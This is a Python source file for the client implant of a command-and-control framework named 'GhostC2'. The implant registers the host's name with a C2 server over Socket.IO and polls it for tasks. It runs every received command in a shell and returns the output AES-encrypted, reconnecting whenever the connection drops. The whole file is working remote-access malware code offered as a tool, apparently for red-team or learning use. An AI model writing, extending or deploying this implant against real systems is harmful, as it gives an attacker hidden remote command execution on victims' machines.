import socketio
import socket
import subprocess
import json
import time
import sys
import os

# Add AES crypto utils
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '../utils')))
from crypto import aes_encrypt, aes_decrypt

# Config
C2_SOCKET_URL = "http://localhost:8080"
HOSTNAME = socket.gethostname()
RETRY_INTERVAL = 5

# Init WebSocket client
sio = socketio.Client()

@sio.event
def connect():
    print("[+] Connected to GhostC2 server.")
    encrypted = aes_encrypt(json.dumps({"hostname": HOSTNAME}))
    sio.emit("register", encrypted)

@sio.on("task")
def on_task(encrypted_data):
    try:
        data = json.loads(aes_decrypt(encrypted_data))
        command = data.get("command")
        if command:
            print(f"[+] Received task: {command}")
            try:
                output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, timeout=15)
                result = output.decode().strip()
            except subprocess.CalledProcessError as e:
                result = f"[!] Command failed:\n{e.output.decode().strip()}"

            print(f"[>] Sending result:\n{result}")
            payload = {
                "hostname": HOSTNAME,
                "command": command,
                "result": result
            }
            sio.emit("result", aes_encrypt(json.dumps(payload)))
    except Exception as e:
        print(f"[!] Decryption or execution failed: {e}")

@sio.event
def disconnect():
    print("[!] Disconnected from server.")

def run_client():
    while True:
        try:
            print("[*] Attempting connection to C2...")
            sio.connect(C2_SOCKET_URL)
            while True:
                task_request = {"hostname": HOSTNAME}
                sio.emit("request_task", aes_encrypt(json.dumps(task_request)))
                time.sleep(3)
        except Exception as e:
            print(f"[!] Connection error: {e}")
            time.sleep(RETRY_INTERVAL)

if __name__ == "__main__":
    run_client()
